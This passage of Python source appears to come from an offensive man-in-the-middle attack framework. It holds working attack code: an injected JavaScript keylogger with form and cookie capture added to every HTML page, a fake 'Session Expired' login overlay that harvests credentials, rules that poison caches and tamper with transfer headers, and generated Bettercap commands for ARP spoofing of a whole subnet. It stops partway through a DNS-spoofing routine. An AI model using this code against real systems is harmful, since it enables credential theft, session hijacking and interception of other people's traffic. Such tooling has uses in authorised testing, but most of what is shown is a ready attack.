    # Script Injector Implementation
    # ========================================================================

    async def _execute_script_injector(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Script Injector - injects JavaScript into HTML responses.

        Capabilities:
        - Keylogging
        - Form capture
        - Cookie theft
        - Session hijacking
        - Phishing
        """
        # Create comprehensive injection script
        injection_script = """<script data-mitm-injected="true">
(function() {
    'use strict';
    var MITM = window.MITM || {};
    MITM.captured = {keys: [], forms: [], cookies: [], clicks: []};

    // Keylogger
    document.addEventListener('keypress', function(e) {
        var target = e.target;
        MITM.captured.keys.push({
            key: e.key,
            keyCode: e.keyCode,
            field: target.name || target.id || target.className,
            fieldType: target.type,
            timestamp: Date.now()
        });
        if (MITM.captured.keys.length >= 20) {
            console.log('[MITM] Captured keystrokes:', JSON.stringify(MITM.captured.keys));
            MITM.captured.keys = [];
        }
    });

    // Form hijacker
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var formData = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            if (input.name && input.type !== 'file') {
                formData[input.name] = input.type === 'password' ? '[REDACTED]' : input.value;
            }
        });
        MITM.captured.forms.push({
            action: form.action,
            method: form.method,
            data: formData,
            timestamp: Date.now()
        });
        console.log('[MITM] Form captured:', JSON.stringify(MITM.captured.forms[MITM.captured.forms.length - 1]));
    });

    // Cookie capture
    MITM.captured.cookies = document.cookie.split(';').map(function(c) {
        var parts = c.trim().split('=');
        return {name: parts[0], value: parts[1] ? parts[1].substring(0, 20) + '...' : ''};
    });
    console.log('[MITM] Cookies captured:', JSON.stringify(MITM.captured.cookies));

    // Click tracking on sensitive elements
    document.addEventListener('click', function(e) {
        var target = e.target;
        if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.type === 'submit') {
            MITM.captured.clicks.push({
                element: target.tagName,
                text: target.innerText ? target.innerText.substring(0, 50) : '',
                href: target.href || '',
                timestamp: Date.now()
            });
        }
    });

    window.MITM = MITM;
    console.log('[MITM] Injection active - monitoring keystrokes, forms, and cookies');
})();
</script></body>"""

        # Apply injection rule
        inject_rule = {
            "name": "Script Injector - Keylogger & Form Capture",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</body>": injection_script,
                "</BODY>": injection_script
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, inject_rule)

        # Count HTML pages that will be affected
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        html_pages = 0
        pages_with_forms = 0

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''

            content_type = headers.get('Content-Type', '')
            if 'text/html' in content_type:
                html_pages += 1
                if '<form' in body.lower() or 'type="password"' in body.lower():
                    pages_with_forms += 1

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "script_injection",
            "title": "JavaScript Injector Active",
            "description": "Keylogger and form capture script injected into all HTML responses.",
            "evidence": json.dumps({
                "rule_id": rule_result.get('rule_id'),
                "html_pages_affected": html_pages,
                "pages_with_forms": pages_with_forms,
                "capabilities": ["Keylogging", "Form capture", "Cookie theft", "Click tracking"]
            }, indent=2),
            "recommendation": "All user input and form submissions will be captured",
            "attack_active": True
        })

        if pages_with_forms > 0:
            result.findings.append({
                "severity": "critical",
                "category": "script_injection",
                "title": f"Found {pages_with_forms} Pages with Forms",
                "description": "These pages contain forms that will have their submissions captured."
            })

        return result

    # ========================================================================
    # Phishing Injector Implementation
    # ========================================================================

    async def _execute_phishing_injector(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Phishing Injector - injects fake login prompts.
        """
        # Apply phishing injection rule (use tool's template)
        if tool.rule_template:
            rule_result = self.mitm_service.add_rule(proxy_id, tool.rule_template)
        else:
            phishing_html = """<div id="mitm-phish-overlay" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;">
<div style="background:#fff;padding:40px;border-radius:12px;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">
  <div style="text-align:center;margin-bottom:24px;">
    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#dc3545" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
  </div>
  <h2 style="color:#1a1a1a;margin:0 0 8px;font-size:24px;text-align:center;">Session Expired</h2>
  <p style="color:#666;margin:0 0 24px;text-align:center;font-size:14px;">Your session has timed out. Please sign in again to continue.</p>
  <form id="mitm-phish-form" onsubmit="console.log('[MITM-PHISH] Credentials:',{u:this.email.value,p:this.password.value});document.getElementById('mitm-phish-overlay').style.display='none';return false;">
    <input name="email" type="text" placeholder="Email or username" style="width:100%;padding:12px 16px;margin-bottom:12px;border:1px solid #ddd;border-radius:8px;font-size:14px;box-sizing:border-box;">
    <input name="password" type="password" placeholder="Password" style="width:100%;padding:12px 16px;margin-bottom:16px;border:1px solid #ddd;border-radius:8px;font-size:14px;box-sizing:border-box;">
    <button type="submit" style="width:100%;padding:14px;background:#0066ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">Sign In</button>
  </form>
  <p style="color:#999;font-size:12px;text-align:center;margin-top:16px;">Secure connection verified</p>
</div>
</div></body>"""

            rule_result = self.mitm_service.add_rule(proxy_id, {
                "name": "Phishing Injector - Session Expired Popup",
                "match_direction": "response",
                "match_content_type": "text/html",
                "action": "modify",
                "body_find_replace": {"</body>": phishing_html, "</BODY>": phishing_html}
            })

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "phishing",
            "title": "Phishing Overlay Injector Active",
            "description": "A convincing 'Session Expired' phishing popup will appear on all HTML pages.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "recommendation": "Captured credentials will be logged to console; monitor for successful capture",
            "attack_active": True
        })

        return result

    # ========================================================================
    # Response Smuggling Implementation
    # ========================================================================

    async def _execute_response_smuggling(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute HTTP Response Smuggling tests.

        Tests for:
        - CL.TE (Content-Length vs Transfer-Encoding) desync
        - TE.CL desync
        - Response queue poisoning
        """
        # Apply Transfer-Encoding manipulation rule
        smuggle_rule = {
            "name": "Response Smuggling - TE Header Manipulation",
            "match_direction": "response",
            "action": "modify",
            "modify_headers": {
                "Transfer-Encoding": "chunked"
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, smuggle_rule)

        # Analyze traffic for smuggling opportunities
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        smuggling_opportunities = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            if not resp:
                continue

            resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}

            has_cl = 'Content-Length' in resp_headers
            has_te = 'Transfer-Encoding' in resp_headers

            # Check for potential vulnerabilities
            issues = []
            if has_cl and has_te:
                issues.append("Both Content-Length and Transfer-Encoding present - potential desync")

            server = resp_headers.get('Server', '').lower()
            if 'nginx' in server or 'apache' in server:
                issues.append(f"Reverse proxy detected ({server}) - chain may be vulnerable")

            if issues:
                smuggling_opportunities.append({
                    "path": getattr(req, 'path', 'unknown') if hasattr(req, 'path') else req.get('path', 'unknown'),
                    "has_content_length": has_cl,
                    "has_transfer_encoding": has_te,
                    "server": server,
                    "issues": issues
                })

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "request_smuggling",
            "title": "Response Smuggling Test Active",
            "description": "Transfer-Encoding headers are being manipulated to test for HTTP desync vulnerabilities.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "attack_active": True
        })

        if smuggling_opportunities:
            result.findings.append({
                "severity": "high",
                "category": "request_smuggling",
                "title": f"Found {len(smuggling_opportunities)} Potential Smuggling Points",
                "description": "These responses show characteristics that may be vulnerable to HTTP smuggling.",
                "evidence": json.dumps(smuggling_opportunities[:5], indent=2)
            })

        return result

    # ========================================================================
    # Slow Loris Implementation
    # ========================================================================

    async def _execute_slow_loris(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Slow Response test - adds delays to test timeout handling.
        """
        delay_ms = tool.rule_template.get('delay_ms', 5000) if tool.rule_template else 5000

        slow_rule = {
            "name": f"Slow Response Tester - {delay_ms}ms Delay",
            "match_direction": "response",
            "action": "delay",
            "delay_ms": delay_ms
        }
        rule_result = self.mitm_service.add_rule(proxy_id, slow_rule)

        result.success = True
        result.findings.append({
            "severity": "low",
            "category": "timing_attack",
            "title": f"Response Delay Active - {delay_ms}ms",
            "description": f"All responses will be delayed by {delay_ms}ms to test application timeout handling and race conditions.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "attack_active": True
        })

        return result

    # ========================================================================
    # Form Hijacker Implementation
    # ========================================================================

    async def _execute_form_hijacker(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute Form Hijacker - captures and analyzes form submissions in traffic.
        """
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        form_submissions = []
        sensitive_forms = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}

            method = getattr(req, 'method', '') if hasattr(req, 'method') else req.get('method', '')
            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            body = getattr(req, 'body_text', '') if hasattr(req, 'body_text') else req.get('body_text', '')

            content_type = headers.get('Content-Type', '')

            # Detect form submissions
            if method == 'POST' and ('form' in content_type or 'json' in content_type):
                form_data = {}

                if 'application/x-www-form-urlencoded' in content_type and body:
                    # Parse form data
                    for pair in body.split('&'):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            # Redact sensitive values
                            if any(s in key.lower() for s in ['password', 'passwd', 'secret', 'token', 'key']):
                                form_data[key] = '[REDACTED]'
                            else:
                                form_data[key] = value[:50] if len(value) > 50 else value

                elif 'application/json' in content_type and body:
                    try:
                        json_data = json.loads(body)
                        for key, value in json_data.items() if isinstance(json_data, dict) else []:
                            if any(s in str(key).lower() for s in ['password', 'passwd', 'secret', 'token']):
                                form_data[key] = '[REDACTED]'
                            else:
                                form_data[key] = str(value)[:50]
                    except:
                        pass

                if form_data:
                    submission = {
                        "path": path,
                        "content_type": content_type.split(';')[0],
                        "fields": list(form_data.keys()),
                        "data": form_data
                    }
                    form_submissions.append(submission)

                    # Check for sensitive forms
                    sensitive_fields = ['password', 'passwd', 'credit', 'card', 'ssn', 'secret']
                    if any(s in str(form_data).lower() for s in sensitive_fields):
                        sensitive_forms.append(submission)

        result.success = True

        if form_submissions:
            result.findings.append({
                "severity": "high",
                "category": "form_hijacking",
                "title": f"Captured {len(form_submissions)} Form Submissions",
                "description": "Form submissions have been captured from intercepted traffic.",
                "evidence": json.dumps(form_submissions[:10], indent=2)
            })

        if sensitive_forms:
            result.findings.append({
                "severity": "critical",
                "category": "credential_exposure",
                "title": f"Found {len(sensitive_forms)} Sensitive Form Submissions",
                "description": "Form submissions containing passwords, credit cards, or other sensitive data.",
                "evidence": json.dumps([{"path": f["path"], "fields": f["fields"]} for f in sensitive_forms[:5]], indent=2),
                "recommendation": "Ensure all sensitive forms are submitted over HTTPS with proper encryption"
            })

        if not form_submissions:
            result.findings.append({
                "severity": "info",
                "category": "form_hijacking",
                "title": "No Form Submissions Captured",
                "description": "No form submissions found in recent traffic. Continue monitoring."
            })

        return result

    # ========================================================================
    # JWT Manipulator Implementation
    # ========================================================================

    async def _execute_jwt_manipulator(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute JWT Manipulator - analyzes and identifies JWT vulnerabilities.
        """
        import base64

        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        jwts_found = []
        vulnerabilities = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})

            # Check Authorization header
            auth = headers.get('Authorization', '')
            if auth.startswith('Bearer '):
                token = auth[7:]
                jwt_analysis = self._analyze_jwt(token)
                if jwt_analysis:
                    jwts_found.append(jwt_analysis)
                    if jwt_analysis.get('vulnerabilities'):
                        vulnerabilities.extend(jwt_analysis['vulnerabilities'])

            # Check for JWTs in cookies
            cookies = headers.get('Cookie', '')
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    if value.count('.') == 2:  # Potential JWT
                        jwt_analysis = self._analyze_jwt(value)
                        if jwt_analysis:
                            jwt_analysis['location'] = f"Cookie: {name}"
                            jwts_found.append(jwt_analysis)
                            if jwt_analysis.get('vulnerabilities'):
                                vulnerabilities.extend(jwt_analysis['vulnerabilities'])

        result.success = True

        if jwts_found:
            result.findings.append({
                "severity": "high",
                "category": "jwt_security",
                "title": f"Analyzed {len(jwts_found)} JWT Tokens",
                "description": "JWT tokens have been captured and analyzed for vulnerabilities.",
                "evidence": json.dumps([{
                    "algorithm": j.get('algorithm'),
                    "issuer": j.get('payload', {}).get('iss'),
                    "expiry": j.get('payload', {}).get('exp'),
                    "vulnerabilities": j.get('vulnerabilities', [])
                } for j in jwts_found[:5]], indent=2)
            })

        if vulnerabilities:
            result.findings.append({
                "severity": "critical",
                "category": "jwt_security",
                "title": f"Found {len(vulnerabilities)} JWT Vulnerabilities",
                "description": "The following JWT security issues were identified.",
                "evidence": json.dumps(list(set(vulnerabilities))[:10], indent=2),
                "recommendation": "Use strong algorithms (RS256/ES256), validate all claims, implement proper expiry"
            })

        if not jwts_found:
            result.findings.append({
                "severity": "info",
                "category": "jwt_security",
                "title": "No JWT Tokens Found",
                "description": "No JWT tokens were found in the captured traffic."
            })

        return result

    def _analyze_jwt(self, token: str) -> Optional[Dict]:
        """Analyze a JWT token for vulnerabilities."""
        import base64

        parts = token.split('.')
        if len(parts) != 3:
            return None

        try:
            # Decode header
            header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            vulnerabilities = []

            # Check algorithm
            alg = header.get('alg', '').upper()
            if alg == 'NONE':
                vulnerabilities.append("CRITICAL: Algorithm 'none' - signature not verified")
            elif alg == 'HS256':
                vulnerabilities.append("Symmetric algorithm (HS256) - may be vulnerable to key brute-force")
            elif alg in ['HS384', 'HS512']:
                vulnerabilities.append(f"Symmetric algorithm ({alg}) - shared secret required")

            # Check for algorithm confusion
            if 'RS' in alg or 'ES' in alg:
                vulnerabilities.append("Asymmetric algorithm - test for algorithm confusion (RS256->HS256)")

            # Check expiry
            exp = payload.get('exp')
            if not exp:
                vulnerabilities.append("No expiry claim (exp) - token never expires")
            elif exp < time.time():
                vulnerabilities.append("Token is expired but may still be accepted")

            # Check for sensitive data
            sensitive_keys = ['password', 'secret', 'credit', 'ssn']
            for key in payload.keys():
                if any(s in key.lower() for s in sensitive_keys):
                    vulnerabilities.append(f"Sensitive data in payload: {key}")

            return {
                "algorithm": alg,
                "header": header,
                "payload": {k: v for k, v in payload.items() if k not in ['password', 'secret']},
                "vulnerabilities": vulnerabilities
            }
        except Exception as e:
            return None

    # ========================================================================
    # WebSocket Hijacker Implementation
    # ========================================================================

    async def _execute_websocket_hijacker(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute WebSocket Hijacker - analyzes WebSocket traffic for vulnerabilities.
        """
        # Get WebSocket connections and frames
        try:
            ws_connections = self.mitm_service.get_websocket_connections(proxy_id)
        except:
            ws_connections = []

        ws_findings = []
        sensitive_messages = []

        for conn in ws_connections[:10]:  # Analyze up to 10 connections
            conn_id = conn.get('id', '')
            try:
                frames_data = self.mitm_service.get_websocket_frames(proxy_id, conn_id, limit=50)
                frames = frames_data.get('frames', [])
            except:
                frames = []

            for frame in frames:
                payload = frame.get('payload_text', '') or ''

                # Check for sensitive data in WebSocket messages
                sensitive_patterns = ['password', 'token', 'secret', 'auth', 'session', 'credit']
                for pattern in sensitive_patterns:
                    if pattern in payload.lower():
                        sensitive_messages.append({
                            "connection_id": conn_id[:8],
                            "direction": frame.get('direction', 'unknown'),
                            "pattern_found": pattern,
                            "payload_preview": payload[:100] + "..." if len(payload) > 100 else payload
                        })
                        break

                # Check for JSON messages that might be exploitable
                if payload.startswith('{') or payload.startswith('['):
                    try:
                        json_data = json.loads(payload)
                        if isinstance(json_data, dict):
                            # Look for command/action patterns
                            if any(k in json_data for k in ['action', 'command', 'type', 'method']):
                                ws_findings.append({
                                    "connection_id": conn_id[:8],
                                    "message_type": json_data.get('action') or json_data.get('command') or json_data.get('type'),
                                    "keys": list(json_data.keys())[:10]
                                })
                    except:
                        pass

        result.success = True

        if ws_connections:
            result.findings.append({
                "severity": "medium",
                "category": "websocket_security",
                "title": f"Analyzed {len(ws_connections)} WebSocket Connections",
                "description": "WebSocket connections have been captured and analyzed.",
                "evidence": json.dumps({
                    "total_connections": len(ws_connections),
                    "message_types_found": len(ws_findings),
                    "sample_message_types": [f["message_type"] for f in ws_findings[:5]]
                }, indent=2)
            })

        if sensitive_messages:
            result.findings.append({
                "severity": "critical",
                "category": "websocket_security",
                "title": f"Found {len(sensitive_messages)} Sensitive WebSocket Messages",
                "description": "WebSocket messages containing potentially sensitive data were captured.",
                "evidence": json.dumps(sensitive_messages[:5], indent=2),
                "recommendation": "Encrypt sensitive data in WebSocket messages; implement message-level authentication"
            })

        if not ws_connections:
            result.findings.append({
                "severity": "info",
                "category": "websocket_security",
                "title": "No WebSocket Connections Found",
                "description": "No WebSocket connections were captured. Ensure WebSocket traffic is routed through the proxy."
            })

        return result

    # ========================================================================
    # API Parameter Tamperer Implementation
    # ========================================================================

    async def _execute_api_param_tamperer(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute API Parameter Tamperer - identifies parameter manipulation opportunities.
        """
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        api_endpoints = []
        tamperable_params = []
        idor_candidates = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            method = getattr(req, 'method', '') if hasattr(req, 'method') else req.get('method', '')
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            body = getattr(req, 'body_text', '') if hasattr(req, 'body_text') else req.get('body_text', '')

            # Identify API endpoints
            if '/api/' in path or any(h in headers.get('Accept', '') for h in ['application/json', 'application/xml']):
                # Extract query parameters
                if '?' in path:
                    base_path, query = path.split('?', 1)
                    params = {}
                    for pair in query.split('&'):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            params[key] = value

                    # Look for IDOR candidates (numeric IDs)
                    for key, value in params.items():
                        if value.isdigit():
                            idor_candidates.append({
                                "path": base_path,
                                "param": key,
                                "value": value,
                                "type": "query_param_numeric_id"
                            })
                        elif any(id_hint in key.lower() for id_hint in ['id', 'user', 'account', 'order']):
                            tamperable_params.append({
                                "path": base_path,
                                "param": key,
                                "value": value[:20],
                                "type": "potential_idor"
                            })

                # Check path for IDs (e.g., /api/users/123)
                path_parts = path.split('/')
                for i, part in enumerate(path_parts):
                    if part.isdigit() and i > 0:
                        idor_candidates.append({
                            "path": path,
                            "position": i,
                            "value": part,
                            "type": "path_numeric_id",
                            "context": path_parts[i-1] if i > 0 else "unknown"
                        })

                api_endpoints.append({
                    "method": method,
                    "path": path.split('?')[0],
                    "has_body": bool(body),
                    "content_type": headers.get('Content-Type', '')
                })

        result.success = True

        # Deduplicate endpoints
        unique_endpoints = {f"{e['method']}:{e['path']}": e for e in api_endpoints}.values()

        result.findings.append({
            "severity": "medium",
            "category": "api_security",
            "title": f"Identified {len(list(unique_endpoints))} API Endpoints",
            "description": "API endpoints have been identified for parameter tampering analysis.",
            "evidence": json.dumps(list(unique_endpoints)[:10], indent=2)
        })

        if idor_candidates:
            result.findings.append({
                "severity": "high",
                "category": "idor",
                "title": f"Found {len(idor_candidates)} Potential IDOR Vulnerabilities",
                "description": "Numeric IDs in parameters or paths that may be vulnerable to IDOR attacks.",
                "evidence": json.dumps(idor_candidates[:10], indent=2),
                "recommendation": "Test by incrementing/decrementing ID values to access other users' data"
            })

        if tamperable_params:
            result.findings.append({
                "severity": "medium",
                "category": "parameter_tampering",
                "title": f"Found {len(tamperable_params)} Tamperable Parameters",
                "description": "Parameters that may be vulnerable to manipulation.",
                "evidence": json.dumps(tamperable_params[:10], indent=2)
            })

        return result

    # ========================================================================
    # Cache Poisoner Implementation
    # ========================================================================

    async def _execute_cache_poisoner(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Cache Poisoner - manipulates cache headers to poison responses.
        """
        # Apply cache manipulation rules
        cache_rule = {
            "name": "Cache Poisoner - Header Manipulation",
            "match_direction": "response",
            "action": "modify",
            "modify_headers": {
                "Cache-Control": "public, max-age=31536000",
                "X-Cache": "HIT",
                "Age": "0",
                "Vary": "X-Forwarded-Host, X-Original-URL"
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, cache_rule)

        # Analyze traffic for cache poisoning opportunities
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        cache_opportunities = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            if not resp:
                continue

            req_headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')

            # Check for caching indicators
            is_cached = any(h in resp_headers for h in ['X-Cache', 'CF-Cache-Status', 'X-Varnish', 'Age'])
            cache_control = resp_headers.get('Cache-Control', '')
            vary = resp_headers.get('Vary', '')

            # Check for unkeyed headers that might poison cache
            unkeyed_opportunities = []
            for header in ['X-Forwarded-Host', 'X-Original-URL', 'X-Rewrite-URL', 'X-Forwarded-Scheme']:
                if header not in vary:
                    unkeyed_opportunities.append(header)

            if is_cached and unkeyed_opportunities:
                cache_opportunities.append({
                    "path": path,
                    "cache_status": resp_headers.get('X-Cache', resp_headers.get('CF-Cache-Status', 'unknown')),
                    "cache_control": cache_control[:50],
                    "unkeyed_headers": unkeyed_opportunities
                })

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "cache_poisoning",
            "title": "Cache Poisoning Rules Active",
            "description": "Cache headers are being manipulated to facilitate cache poisoning attacks.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "attack_active": True
        })

        if cache_opportunities:
            result.findings.append({
                "severity": "critical",
                "category": "cache_poisoning",
                "title": f"Found {len(cache_opportunities)} Cache Poisoning Opportunities",
                "description": "These cached responses have unkeyed headers that may be exploitable.",
                "evidence": json.dumps(cache_opportunities[:5], indent=2),
                "recommendation": "Test by injecting malicious values in unkeyed headers and observing cached responses"
            })

        return result

    # ========================================================================
    # GraphQL Injector Implementation
    # ========================================================================

    async def _execute_graphql_injector(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """
        Execute GraphQL Injector - analyzes GraphQL endpoints for vulnerabilities.
        """
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        graphql_endpoints = []
        introspection_results = []
        vulnerabilities = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            body = getattr(req, 'body_text', '') if hasattr(req, 'body_text') else req.get('body_text', '')
            resp_body = ''
            if resp:
                resp_body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''

            # Detect GraphQL endpoints
            is_graphql = False
            if 'graphql' in path.lower() or '/gql' in path.lower():
                is_graphql = True
            elif body and ('query' in body or 'mutation' in body):
                try:
                    json_body = json.loads(body)
                    if 'query' in json_body or 'mutation' in json_body:
                        is_graphql = True
                except:
                    pass

            if is_graphql:
                graphql_endpoints.append(path)

                # Check for introspection
                if '__schema' in body or '__type' in body:
                    if resp_body and '__schema' in resp_body:
                        vulnerabilities.append("Introspection is enabled - full schema exposed")
                        try:
                            schema_data = json.loads(resp_body)
                            if 'data' in schema_data and '__schema' in schema_data.get('data', {}):
                                types = schema_data['data']['__schema'].get('types', [])
                                introspection_results.append({
                                    "types_count": len(types),
                                    "type_names": [t.get('name') for t in types[:20] if not t.get('name', '').startswith('__')]
                                })
                        except:
                            pass

                # Check for batching
                if body and body.strip().startswith('['):
                    vulnerabilities.append("Batch queries supported - may enable DoS or brute-force")

                # Check for dangerous operations
                if 'deleteUser' in body or 'deleteAll' in body or 'dropTable' in body:
                    vulnerabilities.append("Dangerous mutation detected in traffic")

        result.success = True

        unique_endpoints = list(set(graphql_endpoints))

        if unique_endpoints:
            result.findings.append({
                "severity": "medium",
                "category": "graphql_security",
                "title": f"Found {len(unique_endpoints)} GraphQL Endpoints",
                "description": "GraphQL endpoints have been identified and analyzed.",
                "evidence": json.dumps(unique_endpoints[:5], indent=2)
            })

        if introspection_results:
            result.findings.append({
                "severity": "high",
                "category": "graphql_security",
                "title": "GraphQL Introspection Enabled",
                "description": "The GraphQL API exposes its full schema via introspection queries.",
                "evidence": json.dumps(introspection_results[0] if introspection_results else {}, indent=2),
                "recommendation": "Disable introspection in production to prevent schema exposure"
            })

        if vulnerabilities:
            result.findings.append({
                "severity": "high",
                "category": "graphql_security",
                "title": f"Found {len(set(vulnerabilities))} GraphQL Security Issues",
                "description": "Security vulnerabilities identified in GraphQL implementation.",
                "evidence": json.dumps(list(set(vulnerabilities)), indent=2)
            })

        if not graphql_endpoints:
            result.findings.append({
                "severity": "info",
                "category": "graphql_security",
                "title": "No GraphQL Endpoints Detected",
                "description": "No GraphQL traffic was found. The application may not use GraphQL."
            })

        return result

    # ========================================================================
    # External/Network-Level Tool Implementations
    # ========================================================================

    async def _execute_arp_spoofing(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute ARP Spoofing attack setup.

        Generates Bettercap commands and analyzes network for spoofing opportunities.
        Actual execution requires network interface access.
        """
        # Get target information from proxy config
        target_ip = proxy.target_host
        gateway_ip = "192.168.1.1"  # Default, should be detected

        # Generate Bettercap command
        bettercap_commands = [
            f"# ARP Spoofing Attack Commands for {target_ip}",
            "# Run these commands with Bettercap:",
            "",
            f"bettercap -iface eth0",
            f"set arp.spoof.targets {target_ip}",
            "set arp.spoof.fullduplex true",
            "set arp.spoof.internal false",
            "arp.spoof on",
            "",
            "# Full network spoofing (dangerous):",
            "set arp.spoof.targets 192.168.1.0/24",
            "arp.spoof on",
            "",
            "# Monitor captured traffic:",
            "net.sniff on",
            "set net.sniff.filter 'host " + target_ip + "'",
        ]

        # Analyze traffic for network information
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        observed_ips = set()
        protocols_detected = set()

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            host = getattr(req, 'host', '') if hasattr(req, 'host') else req.get('host', '')
            if host:
                observed_ips.add(host)

            # Check for protocols
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            if 'Authorization' in headers:
                if headers['Authorization'].startswith('Basic'):
                    protocols_detected.add("HTTP Basic Auth (cleartext)")
                else:
                    protocols_detected.add("Bearer/API Auth")
            if 'Cookie' in headers:
                protocols_detected.add("Session Cookies")

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "network_attack",
            "title": "ARP Spoofing Attack Prepared",
            "description": f"ARP spoofing commands generated for target {target_ip}. Execute with Bettercap for full MITM positioning.",
            "evidence": json.dumps({
                "target": target_ip,
                "commands": bettercap_commands,
                "observed_ips": list(observed_ips)[:10],
                "interceptable_protocols": list(protocols_detected)
            }, indent=2),
            "recommendation": "Run Bettercap with the generated commands to establish full network-level MITM",
            "external_tool": "bettercap",
            "commands_ready": True
        })

        if protocols_detected:
            result.findings.append({
                "severity": "high",
                "category": "network_attack",
                "title": f"Found {len(protocols_detected)} Interceptable Protocols",
                "description": "These protocols/auth methods can be captured after ARP spoofing is active.",
                "evidence": json.dumps(list(protocols_detected), indent=2)
            })

        return result

    async def _execute_dns_spoofing(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute DNS Spoofing attack setup.

        Generates commands to redirect DNS queries to attacker-controlled server.
        """
        target_domain = proxy.target_host
        attacker_ip = "ATTACKER_IP"  # Placeholder - should be actual attacker IP

        # Generate DNS spoofing commands
        bettercap_commands = [
            f"# DNS Spoofing Attack Commands",
            "",
